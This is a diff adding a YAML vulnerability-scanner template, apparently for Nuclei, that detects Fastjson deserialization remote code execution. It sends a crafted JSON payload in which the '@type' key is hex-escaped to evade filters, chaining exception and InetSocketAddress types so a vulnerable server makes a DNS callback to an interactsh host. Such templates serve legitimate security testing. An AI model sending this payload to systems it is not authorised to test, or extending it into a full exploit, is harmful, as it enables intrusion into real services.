@@ -1,0 +1,26 @@
+id: fastjson-deserialzation
+
+info:
+  name: fastjson-deserialzation
+  author: fastjson
+  severity: critical
+  tags: fastjson,rce,
+
+http:
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        [{"@\x74ype":"java.lang.Exception","@\x74ype":"com.alibaba.fastjson.JSONException","x":{"@\x74ype":"java.net.InetSocketAddress"{"address":,"val":"{{interactsh-url}}"}}},{"@\x74ype":"java.lang.Exception","@\x74ype":"com.alibaba.fastjson.JSONException","message":{"@\x74ype":"java.net.InetSocketAddress"{"address":,"val":"{{interactsh-url}}"}}}]
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms DNS Interaction
+        words:
+          - "dns"
+
